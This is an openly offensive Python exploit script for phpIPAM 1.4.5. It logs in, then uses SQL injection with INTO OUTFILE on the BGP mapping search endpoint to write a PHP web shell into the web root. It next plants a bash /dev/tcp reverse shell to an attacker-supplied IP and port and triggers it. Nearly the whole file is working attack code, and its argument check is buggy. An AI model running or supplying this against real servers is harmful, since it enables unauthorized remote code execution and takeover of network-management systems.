import time
import requests
import sys
from urllib.parse import urlencode
import codecs
banner = """
                        █████    ██████                        ███          
                       ░░███    ███░░███                      ░░░           
 ████████   ██████   ███████   ░███ ░░░   ██████  █████ █████ ████   ██████ 
░░███░░███ ███░░███ ███░░███  ███████    ███░░███░░███ ░░███ ░░███  ███░░███
 ░███ ░░░ ░███████ ░███ ░███ ░░░███░    ░███ ░███ ░░░█████░   ░███ ░███████ 
 ░███     ░███░░░  ░███ ░███   ░███     ░███ ░███  ███░░░███  ░███ ░███░░░  
 █████    ░░██████ ░░████████  █████    ░░██████  █████ █████ █████░░██████ 
░░░░░      ░░░░░░   ░░░░░░░░  ░░░░░      ░░░░░░  ░░░░░ ░░░░░ ░░░░░  ░░░░░░  
              phpIPAM 1.4.5v Sql Injection to Reverse Shell
                                                                            
python3 phpIPAM_1.4.5_revshell.py <URL> <USERNAME> <PASSWORD> <PORT_FOR_REV_SHELL>                                                                         
 """


BASE_URL = sys.argv[1]
USERNAME = sys.argv[2]
PASSWORD = sys.argv[3]
IP = sys.argv[4]
PORT = sys.argv[5]

if(len(sys.argv != 6)):
    print("Incorrect Parameters")
    exit()

#ipamusername=adsasd&ipampassword=asdasdasd

def loginToWebsite():
    test_without_log = requests.post(f"{BASE_URL}/app/dashboard/widgets/statistics.php")
    data = {
	    "ipamusername": USERNAME,
	    "ipampassword": PASSWORD
	    }
        
    print(f"[...] Trying to log in as {USERNAME}")
    r = requests.post(f"{BASE_URL}/app/login/login_check.php", data=data)
    cookie = (r.cookies['phpipam'])
    test_with_log = requests.post(f"{BASE_URL}/app/dashboard/widgets/statistics.php",cookies={"phpipam":cookie})
    if (test_without_log.headers['Content-Length'] != test_with_log.headers['Content-Length']):
        print("L0gin Succesful")
    else:
        print("L0gin Unsuccessful")   
    return {"phpipam":cookie} 

def exploitSql():

    cookie = loginToWebsite()
    vulnerable_path = f"{BASE_URL}/app/admin/routing/edit-bgp-mapping-search.php"
    payload_hex = codecs.encode(b"<?php system($_GET[cmd]);?>","hex")
    payload_hex=(payload_hex.decode(encoding="ascii"))
    
    data = {
	"subnet": f"\" Union Select 1,0x{payload_hex},1,1 INTO OUTFILE '/var/www/html/foxierce.php' -- -",
	"bgp_id": "1"
	}

    sent_payload = requests.post(vulnerable_path,data=data,cookies=cookie)
    print("RCE Uploaded, Converting it to an interactive shell")
    time.sleep(1)

    stringpayload = f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/'{IP}'/{PORT} 0>&1'");?>"""
    reverse_shell_payload = codecs.encode(str.encode(stringpayload),"hex")
    reverse_shell_payload = (reverse_shell_payload.decode(encoding="ascii"))
    data = {
	"subnet": f"\" Union Select 1,0x{reverse_shell_payload},1,1 INTO OUTFILE '/var/www/html/foxieshell.php' -- -",
	"bgp_id": "1"
	}

    sent_payload = requests.post(vulnerable_path,data=data,cookies=cookie)
    print("Shell Uploaded, Executing...")
    time.sleep(1)
    requests.get(f"{BASE_URL}/foxierce.php?cmd=php%20foxieshell.php")



exploitSql()



